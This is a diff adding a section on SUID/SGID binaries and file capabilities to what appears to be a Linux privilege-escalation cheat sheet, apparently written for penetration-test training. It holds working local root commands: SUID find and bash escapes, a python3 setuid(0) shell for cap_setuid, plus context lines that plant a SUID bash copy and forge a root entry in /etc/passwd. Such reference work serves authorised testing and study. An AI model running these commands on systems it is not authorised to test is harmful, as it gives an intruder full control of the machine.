@@ -2,7 +2,7 @@
 tool: Linux privilege escalation
 slug: linux-privesc
 kind: technique
-stages: [installation]
+stages: [linux]
 category: Local root on Linux
 platforms: [linux]
 services: []
@@ -42,6 +42,33 @@ echo 'cp /bin/bash /tmp/rb; chmod 4777 /tmp/rb' >> /path/writable.sh
 # Writable /etc/passwd: add a root user with a known password
 openssl passwd -1 -salt x pass            # -> put root:$1$...:0:0:/root:/bin/bash
 ```
+
+## SUID/SGID and capabilities, in depth
+
+The SUID bit runs a binary as its owner (often root); SGID does the same for the group. Enumerate both, plus file capabilities, and the custom or unusual ones are the promising leads, not the distro defaults (`passwd`, `ping`, `sudo`).
+
+```bash
+find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null   # SUID, with detail
+find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null   # SGID
+find / -perm -u=s -o -perm -g=s -type f 2>/dev/null         # both in one sweep
+getcap -r / 2>/dev/null                                     # file capabilities
+```
+
+Look each binary up on GTFOBins for the SUID escape, and keep the `-p` flag so the shell holds the elevated UID:
+
+```bash
+/usr/bin/find . -exec /bin/sh -p \; -quit        # SUID find -> root shell (-p!)
+./suidbash -p                                     # SUID bash
+cp --no-preserve=mode ... # write primitive via SUID cp
+```
+
+Capabilities are root's powers split into units a binary can hold without full SUID. `cap_setuid+ep` on an interpreter is instant root; `cap_dac_read_search+ep` reads any file (e.g. `/etc/shadow`); `cap_dac_override+ep` writes any file.
+
+```bash
+/usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'   # cap_setuid+ep
+```
+
+The interactive [Linux map](/cpts/linux/) has the full capability and GTFOBins reference tables.
 
 ## Notes
 
